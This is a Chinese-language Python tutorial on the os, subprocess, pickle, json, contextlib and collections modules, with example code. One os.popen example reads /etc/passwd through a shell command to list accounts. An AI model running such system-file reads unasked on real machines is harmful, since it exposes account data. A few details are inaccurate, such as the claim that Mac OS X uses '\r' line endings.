os.pathsep:返回当前系统上多条路径之间的分隔符。Windows是英文分号(;);在UNIX及类UNIX系统(如Linux、Mac os X)上是英文冒号(:)
os.linesep:返回当前系统的换行符。Windows是"\r\n",UNIX是"\n";Mac os X系统上换行符是"\r"。
os.urandom(size):返回适合作为加密使用的、最多由N个字节组成的bytes对象。该函数通过操作系统特定的随机性来源返回随机字节,该随机字节通常是不可预测的,因此适用于绝大部分加密场景。
os.getcwd() 获取当前工作目录,即当前python脚本工作的目录路径
os.chdir("dirname")  改变当前脚本工作目录;相当于shell下cd
os.curdir  返回当前目录: ('.')
os.pardir  获取当前目录的父目录字符串名:('..')
os.makedirs('dirname1/dirname2') 可生成多层递归目录
os.removedirs('dirname1') 若目录为空则删除,并递归到上一级目录,如若也为空则删除,依此类推
os.mkdir('dirname') 生成单级目录;相当于shell中mkdir dirname
os.rmdir('dirname') 删除单级空目录,若目录不为空则无法删除,报错;相当于shell中rmdir dirname
os.listdir('dirname') 列出指定目录下的所有文件和子目录,包括隐藏文件,并以列表方式打印
os.remove(path)  删除path对应的文件。如果path是一个文件夹则抛出OSError错误,删除目录则使用os.rmdir()
os.rename("oldname","newname")  重命名文件/目录
os.stat('path/filename')  获取文件/目录信息
os.system("bash command")  运行shell命令,直接显示
os.path.abspath(path)  返回path规范化的绝对路径
os.path.split(path)  将path分割成目录和文件名二元组返回
os.path.dirname(path)  返回path的目录。其实就是os.path.split(path)的第一个元素
os.path.basename(path)  返回path最后的文件名。如何path以／或\结尾,那么就会返回空值。即os.path.split(path)的第二个元素
os.path.exists(path)  如果path存在返回True,否则返回False
os.path.isabs(path)  如果path是绝对路径返回True
os.path.isfile(path)  如果path是一个存在的文件返回True,否则返回False
os.path.isdir(path)  如果path是一个存在的目录则返回True,否则返回False
os.path.join(path1[, path2[, ...]])  将多个路径组合后返回,第一个绝对路径之前的参数将被忽略
os.path.getatime(path)  返回path所指向的文件或者目录的最后存取时间
os.path.getmtime(path)  返回path所指向的文件或者目录的最后修改时间

【 在os模块下进程管理函数,可用于启动新进程、中止己有进程等 】
os.abort()
生成一个SIGABRT信号给当前进程。在UNIX系统上默认行为是生成内核转储;在Windows系统上进程立即返回退出代码3。

os.execl(path, arg0, arg1, ...)
该函数还有一系列功能类似的函数如os.execle()、os.execlp()等,都是使用参数列表arg0,arg1等来执行path所代表的执行文件的,由于os.exec*()函数都是PosIX系统的直接映射,因此如采使用该命令来执行Python程序,传入的arg0参数没有什么作用。

os._exit(n)
用于强制退出Python解释器。将其放在try决中可以阻止finally块的执行。

os.forkpty()
fork一个子进程。

os.kill(pid, sig)
将sig信号发送到pid对应的过程,用于结束该进程。

os.killpg(pgid, sig)
将sig信号发送到pgid对应的进程组。

os.popen(cmd, mode='r', buffering=-1)
用于向cmd命令打开读写管道(当mode为r时为只读管道,当mode为rw时为读写管道),buffering缓冲参数与内置的open()函数有相同的含义。该函数返回的文件对象用于读写字符串,而不是字节。

os.spawnl(mode, path, ...)
该函数还有一系列功能类似的函数如os.spawnle()、os.spawnlp()等,都用于在新进程中执行新程序。

os.startfile(path[,operation])
对指定文件使用该文件关联的工具执行operation对应的操作。如果不指定operation操作则默认执行打开(open)操作。operation参数必须是有效的命令行操作项目,如open(打开)、edit(编辑)、print(打印)等。

os.system(command)
运行操作系统上的指定命令。

</pre>示范在os模块中与进程管理相关的函数的功能<textarea>
import os
os.system('cmd')            # 运行平台上的cmd命令
os.startfile('g:\\abc.xls') # 使用默认应用程序打开文件,如Excel打开g:\abc.xls文件
os.spawnl(os.P_NOWAIT, 'E:\\Tools\\编辑工具\\Notepad++.7.5.6.bin.x64\\notepad++.exe', ' ') # 打开Notepad++
os.execl("E:\\soft\\Python\\python.exe", " ", 'test.py', 'i')  # 使用python命令执行os_test.py

'''
如果直接运行上面程序,可以看到程序运行后使用Excel打开了abe.xls文件,也工具,还使用python命令运行了os_test.py文件。但如果将程序中粗体字代码取消注释,将看到程序运行后只是启动了cmd命令行程序,这是因为使用as.system()函数来运行程序时,新程序所在的进程会替代原有的进程。
在使用os.execl()函数时新进程之后,也会取代原有的进程,因此上面程序将这行代码放在了最后。
'''

</textarea>

<h4>os模块执行系统命令的4种方法</h4><pre>
【 os.system(command) 】
仅在一个子终端运行系统命令,返回执行的命令的返回值如0,并不是执行结果
调用外部系统命令,返回命令结果码如0,但是无法获取命令执行输出结果,输出结果直接打印到屏幕终端

system(command) -> exit_status
Execute the command (a string) in a subshell

</pre><textarea>
result = os.system('ls *.py') # 'hello.py\n', 'ligui.py\n'
print(result)                 # 0
result = os.system('dir')     # 'hello.py\n', 'ligui.py\n'
print(result)                 # 0

import os
retcode = os.system('ping 127.0.0.1')
if retcode == 0:
    print "%s Success" % (ip,)
else:
    print "%s Fail" % (ip,)

</textarea><pre>
【 os.popen 】
该方法不但执行命令还返回执行后的信息对象,可将返回的结果赋于一变量,便于程序的处理
调用外部系统命令,返回命令执行输出结果,但不返回结果码
返回一个类文件对象,调用该对象的read()或readlines()方法可以读取输出内容

popen(command [, mode='r' [, bufsize]]) -> pipe
Open a pipe to/from a command returning a file object.

</pre><textarea>
result = os.popen('ls *.py')
print(result)    # < os._wrap_close object at 0x7f8939ce1358>
tmp = result.readlines()
print(tmp)       # # ['hello.py\n', 'ligui.py\n' ]

import os
userlines = os.popen("cat /etc/passwd").readlines()
for i in userlines:
    userinfo = i.split(":")
    print("username is",userinfo[0],"\tuid is",userinfo[2])

</textarea><pre>
【 使用模块subprocess 】
subprocess模块可替代旧模块的方法如os.system()、os.popen()等
subporcess模块可调用外部系统命令来创建新子进程,同时可以连接到子进程的nput/output/error管道上,并得到子进程的返回值。subprocess模块主要有call()、check_call()、check_output()、Popen()函数

subprocess.Popen类
subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)

参数说明:
args:要调用的外部系统命令。
bufsize:默认值为0, 表示不缓存,。为1表示行缓存,。其他正数表示缓存使用的大小,,负数-1表示使用系统默认的缓存大小。
stdin、stdout、stdout:分别表示标准输入、标准输出和标准错误。其值可以为PIPE、文件描述符和None等。默认值为None,表示从父进程继承。
shell:Linux:参数值为False时,Linux上通过调用os.execvp执行对应的程序。为Trule时,Linux上直接调用系统shell来执行程序;Windows:shell参数表示是否使用bat作为执行环境。只有执行windows的dir、copy等命令时才需要设置为True。其他程序没有区别。
executable:用于指定可执行程序。一般情况下通过args参数来设置所要运行的程序。如果将参数shell设为True,executable将指定程序使用的shell。在windows平台下,默认的shell由COMSPEC环境变量来指定。
preexec_fn:只在Unix平台下有效,用于指定一个可执行对象(callable object),它将在子进程运行之前被调用
cwd:设置子进程当前目录
env:env是字典类型,用于指定子进程的环境变量。默认值为None,表示子进程的环境变量将从父进程中继承。
Universal_newlines:不同操作系统下,文本的换行符是不一样的。如:windows下用'/r/n'表示换,而Linux下用'/n'。如果将此参数设置为True,Python统一把这些换行符当作'/n'来处理。

Popen对象对应的属性和方法如下:
属性:stdin, stdout, stderr, pid, returncode
方法:
communicate(self, input=None) -> returns a tuple (stdout, stderr).
wait(self) -> Wait for child process to terminate.  Returns returncode attribute.

常用实例
1、D:\temp目录下创建test目录。直接调用进程,不考虑获取调用命令输出内容和结果码
import subprocess
p = subprocess.Popen(args='mkdir test', shell=True, cwd='d:/temp')
p.wait()

2、调用ping命令执行,获取命令执行输出内容,p.stdout、p.stdin、p.stderr为文件对象,可以使用文件对象函数如read()
import subprocess
p = subprocess.Popen(args='ping -n 2 -w 3 192.168.1.104', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
p.wait()
print p.stdout.read()

subprocess.call()
函数原型:call(*popenargs, **kwargs)。call()调用外部系统命令执行,并返回程序执行结果码。

import subprocess
retcode = subprocess.call('ping -n 2 -w 3 192.168.1.104', shell=True)
print retcode

>>> import subprocess
>>> subprocess.call(["cmd", "arg1", "arg2"],shell=True)

获取返回和输出:
import subprocess
p = subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
for line in p.stdout.readlines():
    print(line, end=" ")
retval = p.wait()
# b'__pycache__\n' b'awesome-python3-webapp\n' b'dog.jpg\n' b'first_package\n' b'hello.py\n' b'img\n' b'ligui.py\n' b'module1.py\n' b'server.py\n' b'test.db\n' b'test.py\n'

from subprocess import call
result = call(["ls", "-a"])
print('result', result)
'''
.   __pycache__             dog.jpg        hello.py  ligui.py    server.py  test.py
..  awesome-python3-webapp  first_package  img       module1.py  test.db
result 0
'''

subprocess.check_call()
使用方法同call()。如果调用命令执行成功则返回结果码0,如果执行失败则抛出CalledProcessError.异常
import subprocess
p = subprocess.check_call('ping 127.0.0.1', shell=True)

subprocess.check_output()
函数原型:check_output(*popenargs, **kwargs)
用法与call()相同。区别是如果执行成功返回的是标准输出内容,如果失败则抛CalledProcessError.异常。

import subprocess
output = subprocess.check_output('ping 127.0.0.1', shell=True)
print output

【 使用模块commands,该模块用于Python2,到了Python3不推荐使用 】
>>> import commands
>>> dir(commands)
>>> commands.getoutput("date")
>>> commands.getstatusoutput("date")

当执行命令的参数或返回中包含了中文文字,那么建议使用subprocess,如果使用os.popen则会出现下面的错误:
Traceback (most recent call last):
  File "./test1.py", line 56, inmain()
  File "./test1.py", line 45, in main
    fax.sendFax()
  File "./mailfax/Fax.py", line 13, in sendFax
    os.popen(cmd)
UnicodeEncodeError: 'ascii' codec can't encode characters in position 46-52: ordinal not inrange(128)

</pre>
</div>

<div id="json">
<h3>使用Python语言来编码和解码JSON对象</h3>
<h4>序列化</h4><pre>
在程序运行的过程中,所有的变量都是在内存中
d = dict(name='Bob', age=20, score=88)
可以随时修改变量,比如把name改成'Bill',但是一旦程序结束,变量所占用的内存就被操作系统全部回收。如果没有把修改后的'Bill'存储到磁盘上,下次重新运行程序,变量又被初始化为'Bob'。

变量从内存中变成可存储或传输的过程称为序列化,在Python中叫pickling,在其他语言中也被称之为serialization、marshalling、flattening等,序列化之后就可以把序列化后的内容写入磁盘或者通过网络传输到别的机器上。
反过来,把变量内容从序列化的对象重新读到内存里称之为反序列化,即unpickling。

Pickle的问题和所有其他编程语言特有的序列化问题一样,就是它只能用于Python,并且可能不同版本的Python彼此都不兼容,因此,只能用Pickle保存那些不重要的数据,不能成功地反序列化也没关系

Python提供了pickle模块来实现序列化
pickle.dumps()方法把任意对象序列化成一个bytes,然后就可以把这个bytes写入文件
或者用另一个方法pickle.dump()直接把对象序列化后写入一个file-like Object

要把对象从磁盘读到内存时,可以先把内容读到一个bytes,然后用pickle.loads()方法反序列化出对象,也可以直接用pickle.load()方法从一个file-like Object中直接反序列化出对象

</pre>把一个对象序列化并写入文件<textarea>
import pickle
d = dict(name='Bob', age=20, score=88)
result = pickle.dumps(d)
print(type(result), result)
# < class 'bytes'> b'\x80\x03}q\x00(X\x03\x00\x00\x00ageq\x01K\x14X\x05\x00\x00\x00scoreq\x02KXX\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00Bobq\x04u.'

result = pickle.loads(b'\x80\x03}q\x00(X\x03\x00\x00\x00ageq\x01K\x14X\x05\x00\x00\x00scoreq\x02KXX\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00Bobq\x04u.')
print(type(result), result)
# < class 'dict'> {'age': 20, 'score': 88, 'name': 'Bob'}

f = open('dump.txt', 'wb')
pickle.dump(d, f)
f.close()

f = open('dump.txt', 'rb')
d = pickle.load(f)
f.close()
print(d)      # {'age': 20, 'score': 88, 'name': 'Bob'}

</textarea>

<h4>json模块</h4><pre>
json(JavaScript Object Notation)是一种轻量级的数据交换格式,易于人阅读和编写
JSON表示出来就是一个字符串,可以被所有语言读取,也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式,并且比XML更快,而且可以直接在Web页面中读取,非常方便

Python内置的json模块提供了对JSON的支持,它既包含了将JSON字符串恢复成Python对象的函数,也提供了将Python对象转换成JSON字符串的函数,使用JSON函数需要导入json库:import json

python原始类型向json类型的转化:
dict  =>  object
list, tuple  => array
str  =>  string
int, float  =>  number
True  =>  true
False  => false
None  =>  null

json类型转换到python的类型:
object  =>  dict
array  => list
string  => str
number (int)  =>  int
number (real)  => float
true  =>  True
false  => False
null  =>  None

JSON这种简单的序列化技术可以处理列表和字典,但是在JSON中序列化任意类的实例需要额外的努力,而pickle是一种允许对任意复杂Python对象进行序列化的协议,因此它为Python所特有,不能用于与其他语言编写的应用程序通信。默认情况下它也是不安全的:如果数据是由熟练的攻击者精心设计的,则反序列化来自不受信任来源的pickle数据可以执行任意代码

【 dumps()和dump()函数的encode操作:将Python对象转换成JSON字符串 】
dumps()和dump()函数的功能、所支持的选项基本相同,只是dumps()直接返回转换得到的JSON字符串,而dump()则将转换得到的JSON字符串输出到文件中
程序调用json.JSONEncoder对象的encode()方法也可以将Python对象转换为JSON字符串。而dumps()和dump()函数是更高级的调用方式,一般调用dumps()和dump()对Python对象执行转换即可

json.dump(obj, fp, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)
将obj对象转换成JSON字符串输出到fp流中,fp是一个支持write()方法的类文件对象(file-like Object)

json.dumps(obj, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan= True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)
json.dumps(obj, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, encoding="utf-8", default=None, sort_keys=False, **kw)
将obj对象转换为JSON字符串,将Python对象编码成JSON字符串,并返回该JSON字符串

</pre><textarea>
import json
# 将Python对象转JSON字符串(元组会当成数组)
s = json.dumps(['yeeku', {'favorite': ('coding', None, 'game', 25)}])
print(s) # ["yeeku", {"favorite": ["coding", null, "game", 25]}]
# 简单的Python字符串转JSON
s2 = json.dumps("\"foo\bar")
print(s2) #"\"foo\bar"
# 简单的Python字符串转JSON
s3 = json.dumps('\\')
print(s3) #"\\"
# Python的dict对象转JSON,并对key排序
s4 = json.dumps({"c": 0, "b": 0, "a": 0}, sort_keys=True)
print(s4) #{"a": 0, "b": 0, "c": 0}
# 将Python列表转JSON,并指定JSON分隔符:逗号和冒号之后没有空格(默认有空格)
s5 = json.dumps([1, 2, 3, {'x': 5, 'y': 7}], separators=(',', ':'))
# 输出的JSON字符串中逗号和冒号之后没有空格
print(s5) # '[1,2,3,{"x":5,"y":7}]'
# 指定indent为4,意味着转换的JSON字符串有缩进
s6 = json.dumps({'Python': 5, 'Kotlin': 7}, sort_keys=True, indent=4)
print(s6)

# 使用JSONEncoder的encode方法将Python转JSON
s7 = json.JSONEncoder().encode({"names": ("孙悟空", "齐天大圣")})
print(s7) # {"names": ["\u5b59\u609f\u7a7a", "\u9f50\u5929\u5927\u5723"]}

f = open('a.json', 'w')
# 使用dump()函数将转换得到JSON字符串输出到文件
json.dump(['Kotlin', {'Python': 'excellent'}], f)

</textarea><pre>
【 loads()和load()函数的decode操作:将JSON字符串转换成Python对象 】

json.load(fp, *, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw)
从fp流读取JSON字符串,将其恢复成JSON对象,其中fp是一个支持write()方法的类文件对象,从file-like Object中读取字符串并反序列化

json.loads(s, *, encoding=None, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw)
json.loads(s[, encoding[, cls[, object_hook[, parse_float[, parse_int[, parse_constant[, object_pairs_hook[, **kw]]]]]]]])
将JSON字符串s恢复成JSON对象,把JSON反序列化为Python对象,把JSON的字符串反序列化
loads()用于解码JSON数据,将已编码的JSON字符串解码为Python对象,该函数返回Python字段的数据类型
用eval内置方法可以将一个字符串转成python对象,不过eval方法是有局限性的,对于普通的数据类型,json.loads和eval都能用,但遇到特殊类型时eval就不管用了,所以eval的重点还是通常用来执行一个字符串表达式,并返回表达式的值。

</pre><textarea>
import json
# 将JSON字符串恢复成Python列表
result1 = json.loads('["yeeku", {"favorite": ["coding", null, "game", 25]}]')
print(result1) # ['yeeku', {'favorite': ['coding', None, 'game', 25]}]

# 将JSON字符串恢复成Python字符串
result2 = json.loads('"\\"foo\\"bar"')
print(result2) # "foo"bar

# 通过使用自定义的恢复函数,可以完成JSON类型到Python特殊类型(如复数、矩阵)的转换
# 定义一个自定义的转化函数,该函数负责将一个原本应该恢复成dict对象的JSON字符串恢复成复数,并负责将字典中real对应的值转换成复数的实部,将字典中imag对应的值转换成复数的虚部
def as_complex(dct):
    if '__complex__' in dct:
        return complex(dct['real'], dct['imag'])
    return dct
# 使用自定义的恢复函数,自定义回复函数将real数据转成复数的实部,将imag转成复数的虚部
result3 = json.loads('{"__complex__": true, "real": 1, "imag": 2}', object_hook=as_complex)
print(result3) # (1+2j)

f = open('a.json')
# 从文件流恢复JSON列表
result4 = json.load(f)
print(result4) # ['Kotlin', {'Python': 'excellent'}]

</textarea><pre>
Python支持更多的JSON所不支持的类型,比如复数、矩阵等,如果直接使用dumps()或dump()函数进行转换,程序肯定会出问题。此时就需要开发者对JSONEncoder类进行扩展,通过这种扩展来完成从Python特殊类型到JSON类型的转换。

</pre>通过扩展JSONEncoder来实现从Python复数到JSON字符串的转换<textarea>
import json

# 定义JSONEncoder的子类
class ComplexEncoder(json.JSONEncoder):
    def default(self, obj):
        # 如果要转换的对象是复数类型,程序负责处理
        if isinstance(obj, complex):
            return {"__complex__": 'true', 'real': obj.real, 'imag': obj.imag}
        # 对于其他类型,还使用JSONEncoder的默认处理
        return json.JSONEncoder.default(self, obj)

s1 = json.dumps(2 + 1j, cls=ComplexEncoder)
print(s1) # '{"__complex__": "true", "real": 2.0, "imag": 1.0}'
s2 = ComplexEncoder().encode(2 + 1j)
print(s2) # '{"__complex__": "true", "real": 2.0, "imag": 1.0}'

'''
上面程序扩展了JSONEncoder类的子类,并重写了它的default()方法,在方法中判断如果要转换的目标类型是复数(complex),程序就会进行自定义转换,即将复数转换成JSON对象,且该对象包含"_complex_":'true'属性。

一旦扩展了JSONEncoder的子类之后,程序有两种方式来使用自定义的子类:
1、在dumps()或dump()函数中通过cls属性指定使用JSONEncoder的自定义子类。
2、直接使用JSONEncoder的自定义子类的encode()方法来执行转换
'''

</textarea><textarea>
import json

print(json.__all__)         # ['dump', 'dumps', 'load', 'loads', 'JSONDecoder', 'JSONDecodeError', 'JSONEncoder']

# 序列化
dic = {'name': 'alvin', 'age': 23, 'sex': 'male'}
print(type(dic))            # < class 'dict'>
j = json.dumps(dic)
print(type(j), j)           # < class 'str'> {"name": "alvin", "age": 23, "sex": "male"}

result = json.loads('{"name": "alvin", "age": 23, "sex": "male"}')
print(type(result), result) # < class 'dict'> {'name': 'alvin', 'age': 23, 'sex': 'male'}

f = open('序列化对象', 'w')  # 文件名为'序列化对象'
f.write(j)                  # 等价于json.dump(dic,f)
f.close()

# 反序列化
f = open('序列化对象')
data = json.loads(f.read())  # 等价于data = json.load(f)
print(data)                  # {'name': 'alvin', 'age': 23, 'sex': 'male'}
print(type(data), data)      # < class 'dict'> {'name': 'alvin', 'age': 23, 'sex': 'male'}

</textarea><textarea>
import json

data = [ { 'a' : 1, 'b' : 2, 'c' : 3, 'd' : 4, 'e' : 5 } ]
print(json.dumps(data))        # [{"a": 1, "c": 3, "b": 2, "e": 5, "d": 4}]

# 使用参数让JSON数据格式化输出
print(json.dumps({'a': 'Runoob', 'b': 7}, sort_keys=True, indent=4, separators=(',', ': ')))
{
    "a": "Runoob",
    "b": 7
}

x = "[null,true,false,1]"
#print(eval(x))
print(json.loads(x))           # [None, True, False, 1]

jsonData = '{"a":1,"b":2,"c":3,"d":4,"e":5}';
print(json.loads(jsonData))    # {u'a': 1, u'c': 3, u'b': 2, u'e': 5, u'd': 4}

</textarea><pre>
【 类的实例化对象和json相互转换 】
Python的dict对象可以直接序列化为JSON的{},不过很多时候们更喜欢用class表示对象,比如定义Student类,然后序列化

</pre><textarea>
import json

class Student(object):
    def __init__(self, name, age, score):
        self.name = name
        self.age = age
        self.score = score

s = Student('Bob', 20, 88)
print(json.dumps(s))        # TypeError: Object of type 'Student' is not JSON serializable

</textarea><pre>
错误的原因是Student对象不是一个可序列化为JSON的对象,默认情况下dumps()方法不知道如何将Student实例变为一个JSON的{}对象
dumps()可选参数default就是把任意一个对象变成一个可序列为JSON的对象,只需要为Student专门写一个转换函数,再把函数传进去即可
这样Student实例首先被student2dict()函数转换成dict,然后再被顺利序列化为JSON

</pre><textarea>
def student2dict(std):
    return {
        'name': std.name,
        'age': std.age,
        'score': std.score
    }

print(json.dumps(s, default=student2dict))  # {"name": "Bob", "age": 20, "score": 88}

</textarea><pre>
下次如果遇到一个Teacher类的实例,照样无法序列化为JSON,可以把任意class的实例变为dict:
print(json.dumps(s, default=lambda obj: obj.__dict__))
因为通常class的实例都有一个__dict__属性,它就是一个dict,用来存储实例变量。也有少数例外,比如定义了__slots__的class

同样的道理,如果要把JSON反序列化为一个Student对象实例,loads()方法首先转换出一个dict对象,然后传入的object_hook函数负责把dict转换为Student实例:

</pre><textarea>
def dict2student(d):
    return Student(d['name'], d['age'], d['score'])

json_str = '{"age": 20, "score": 88, "name": "Bob"}'
print(json.loads(json_str, object_hook=dict2student))  # <__main__.Student object at 0x10cd3c190>

</textarea>如果要处理的是文件而不是字符串,可以使用json.dump()和json.load()来编码和解码JSON数据<textarea>
import json

# Writing JSON data
with open('data.json', 'w') as f:
    json.dump(data, f)

# Reading data back
with open('data.json', 'r') as f:
    data = json.load(f)

</textarea><pre>
【 使用第三方库:Demjson 】
Demjson是python的第三方模块库,可用于编码和解码JSON数据,包含了JSONLint的格式化及校验功能
Github地址:https://github.com/dmeranda/demjson

使用Demjson编码或解码JSON数据前需要先安装Demjson模块
$ tar -xvzf demjson-2.2.3.tar.gz
$ cd demjson-2.2.3
$ python setup.py install

demjson.encode(self, obj, nest_level=0)
将Python对象编码成JSON字符串

demjson.decode(self, txt)
将已编码的JSON字符串解码为Python对象,返回Python字段的数据类型。

</pre><textarea>
#!/usr/bin/python
import demjson

data = [ { 'a' : 1, 'b' : 2, 'c' : 3, 'd' : 4, 'e' : 5 } ]
json = demjson.encode(data)
print(json)   # [{"a":1,"b":2,"c":3,"d":4,"e":5}]

json = '{"a":1,"b":2,"c":3,"d":4,"e":5}';
text = demjson.decode(json)
print(text)   # {u'a': 1, u'c': 3, u'b': 2, u'e': 5, u'd': 4}

</textarea>
</div>

<div id="contextlib">
<h4>contextlib</h4><pre>
在Python中读写文件这样的资源要特别注意,必须在使用完毕后正确关闭它们

</pre><textarea>
# 正确关闭文件资源的一个方法是使用try...finally
try:
    f = open('/path/to/file', 'r')
    f.read()
finally:
    if f:
        f.close()

# 写try...finally非常繁琐。Python的with语句可非常方便地使用资源,而不必担心资源没有关闭,所以上面的代码可以简化为：
with open('/path/to/file', 'r') as f:
    f.read()

</textarea>并不是只有open()函数返回的fp对象才能使用with语句,实际上任何对象只要正确实现了上下文管理就可以用于with语句,实现上下文管理是通过__enter__和__exit__这两个方法实现的<textarea>
class Query(object):
    def __init__(self, name):
        self.name = name

    def __enter__(self):
        print('Begin')
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        if exc_type:
            print('Error')
        else:
            print('End')

    def query(self):
        print('Query info about %s...' % self.name)

with Query('Bob') as q:
    q.query()

# 输出：
Begin
Query info about Bob...
End

</textarea><pre>
【 @contextmanager 】
编写__enter__和__exit__仍然很繁琐,因此Python的标准库contextlib提供了更简单的写法@contextmanager

</pre><textarea>
from contextlib import contextmanager

class Query(object):
    def __init__(self, name):
        self.name = name

    def query(self):
        print('Query info about %s...' % self.name)

@contextmanager
def create_query(name):
    print('Begin')
    q = Query(name)
    yield q
    print('End')

# @contextmanager这个decorator接受一个generator,用yield语句把with ... as var把变量输出出去,然后with语句就可以正常地工作了：
with create_query('Bob') as q:
    q.query()

</textarea>某段代码执行前后自动执行特定代码可以用@contextmanager实现<textarea>
from contextlib import contextmanager

@contextmanager
def tag(name):
    print("<%s>" % name)
    yield
    print("</%s>" % name)

with tag("h1"):
    print("hello world")

# 输出：
< h1>
hello world
< /h1>

</textarea><pre>
代码的执行顺序是：
with语句首先执行yield之前的语句,因此打印出< h1>
yield调用会执行with语句内部的所有语句,因此打印出hello world
最后执行yield之后的语句,打印出< /h1>。

因此@contextmanager让我们通过编写generator来简化上下文管理。

【 contextlib.closing 】
如果一个对象没有实现上下文就不能把它用于with语句。这个时候可以用closing()来把该对象变为上下文对象,例如用with语句使用urlopen()：

</pre><textarea>
from contextlib import closing
from urllib.request import urlopen

with closing(urlopen('https://www.python.org')) as page:
    for line in page:
        print(line)

</textarea>closing也是一个经过@contextmanager装饰的generator,这个generator编写起来其实非常简单,它的作用就是把任意对象变为上下文对象,并支持with语句<textarea>
@contextmanager
def closing(thing):
    try:
        yield thing
    finally:
        thing.close()

</textarea>
</div>

<div id="collections">
<h4>collections</h4><pre>
collections是Python内建的一个集合模块,提供了许多有用的集合类

</pre><textarea>
import collections
print([e for e in dir(collections) if not e.startswith('_')])
# ['AsyncGenerator', 'AsyncIterable', 'AsyncIterator', 'Awaitable', 'ByteString', 'Callable', 'ChainMap', 'Collection', 'Container', 'Coroutine', 'Counter', 'Generator', 'Hashable', 'ItemsView', 'Iterable', 'Iterator', 'KeysView', 'Mapping', 'MappingView', 'MutableMapping', 'MutableSequence', 'MutableSet', 'OrderedDict', 'Reversible', 'Sequence', 'Set', 'Sized', 'UserDict', 'UserList', 'UserString', 'ValuesView', 'abc', 'defaultdict', 'deque', 'namedtuple']

</textarea><pre>
【 namedtuple工厂函数功能及用法 】
tuple可以表示不变集合,例如一个点的二维坐标可以表示成p = (1, 2),但(1, 2)很难看出这个tuple是用来表示一个坐标的,定义一个class又小题大做了,这时namedtuple就派上了用场

namedtuple()是一个工厂函数,使用该函数可以创建一个tuple类的子类,该子类可以为tuple的每个元素都指定宇段名,这样程序就可以根据字段名来访问namedtuple的各元素了。如果有需要程序依然可以根据索引来访问namedtuple的各元素。

namedtuple是轻量级的,性能很好,其并不比普通tuple需要更多的内存

namedtuple(typename, field_names, *, verbose=False, rename=False, module=None)
typename:该参数指定所创建的tuple子类的类名,相当于用户定义了一个新类。
field_names:该参数是一个字符串序列如['x','y'],也可直接使用单个字符串代表所有字段名,多个字段名用空格、逗号隔开如'x y'或'x,y'。任何有效的Python标识符都可作为字段名(不能以下画线开头)。有效的标识符可由字母、数字、下画线组成,但不能以数字、下划线开头,也不能是关键字如return、global、pass、raise等
rename:该参数设为True表示无效的字段名将会被自动替换为位置名,如['abc','def','ghi','abc']将会被替换为['abc', '_1','ghi','_3'],因为def字段名是关键字,而abc字段名重复了。
verbose:该参数被设为True表示当该子类被创建之后,该类定义就会被立即打印出来。
module:如果设置了该参数,那么该类将位于该模块下,因此该自定义类的__module__属性将被设为该参数值

Python还为命名元组提供了如下方法和属性:
_make(iterable):类方法,该方法用于根据序列或可迭代对象创建命名元组对象。
_asdict():将当前命名元组对象转换为OrderedDict字典。
_replace(**kwargs):替换命名元组中一个或多个字段的值。
_source:该属性返回定义该命名元组的源代码。
_fields:该属性返回该命名元组中所有字段名组成的元组。

</pre><textarea>
from collections import namedtuple
# 定义命名元组类:Point
Point = namedtuple('Point', ['x', 'y'])
# 初始化Point对象,即可用位置参数,也可用命名参数
p = Point(11, y=22)
print(type(Point))           # < class 'type'>
print(type(p))               # < class '__main__.Point'>
# 像普通元组一样用根据索引访问元素
print(p[0], p[1])            # 11, 22
# 根据字段名访问各元素
print(p.x, p.y)              # 11, 22
# 执行元组解包,按元素的位置解包
a, b = p
print(a, b)                  # 11, 22
print(p)                     # Point(x=11, y=22)
print(isinstance(p, Point))  # True
print(isinstance(p, tuple))  # True

my_data = ['East', 'North']
# 创建命名元组对象
p2 = Point._make(my_data)
print(p2)               # Point(x='East', y='North')
# 将命名元组对象转换成OrderedDict
print(p2._asdict())     # OrderedDict([('x', 'East'), ('y', 'North')])
# 替换命名元组对象的字段值
p2._replace(y='South')
print(p2)               # Point(x='East', y='North')
# 输出p2包含的所有字段
print(p2._fields)       # ('x', 'y')
# 再次定义一个命名元组类
Color = namedtuple('Color', 'red green blue')
# 再次定义命名元组类,其字段由Point的字段加上Color的字段
Pixel = namedtuple('Pixel', Point._fields + Color._fields)
# 创建Pixel对象,分别为x、y、red、green、blue字段赋值
pix = Pixel(11, 22, 128, 255, 0)
print(pix)              # Pixel(x=11, y=22, red=128, green=255, blue=0)

# 用坐标和半径表示一个圆:
Circle = namedtuple('Circle', ['x', 'y', 'r'])

</textarea><pre>
【 OrderedDict 】
使用dict时Key是无序的,在对dict做迭代时无法确定Key的顺序,用OrderedDict可保持Key的顺序,OrderedDict的Key会按照插入的顺序排列,不是Key本身排序

OrderedDict也是dict的子类,其最大特征是可以维护添加key-value对的顺序,先添加的key-value对排在前面,后添加的key-value对排在后面。
由于OrderedDict能维护key-value对的添加顺序,因此即使两个OrderedDict中的key-value对完全相同,但只要它们的顺序不同,程序在判断它们是否相等时也依然会返回false

</pre><pre>
from collections import OrderedDict

d = dict([('a', 1), ('b', 2), ('c', 3)])
print(d)                    # {'a': 1, 'c': 3, 'b': 2}
od = OrderedDict([('a', 1), ('b', 2), ('c', 3)])
print(od)                   # OrderedDict([('a', 1), ('b', 2), ('c', 3)])
print(type(od))             # < class 'collections.OrderedDict'>
print(isinstance(od, dict)) # True

# 按照插入的Key的顺序返回
od = OrderedDict()
od['z'] = 1
od['y'] = 2
od['x'] = 3
list(od.keys())    # ['z', 'y', 'x']

# 创建OrderedDict对象
dx = OrderedDict(b=5, c=2, a=7)
print(dx)          # OrderedDict([('b', 5), ('c', 2), ('a', 7)])

d = OrderedDict()
